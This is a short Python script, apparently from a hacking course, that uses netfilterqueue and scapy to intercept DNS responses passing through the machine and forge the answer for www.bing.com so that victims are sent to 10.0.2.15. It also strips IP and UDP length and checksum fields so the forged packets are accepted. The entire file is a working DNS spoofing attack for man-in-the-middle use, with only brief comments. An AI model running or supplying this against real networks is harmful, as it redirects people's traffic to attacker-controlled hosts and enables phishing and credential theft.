#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):          # if our packet contains DNS Request Response
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in qname:		# target web-site name
			print("[+] Spoofing target Bing.com")
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15") # Spoofed answer, Redirecting client to 10.0.2.15 IP address
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
							# Deleting IP len chksum and UDP len chksum, becouse it's verification and it can stop our script
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(str(scapy_packet))

	packet.accept()
	# packet.drop() - will not allow to use Internet - Blockes Internet

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
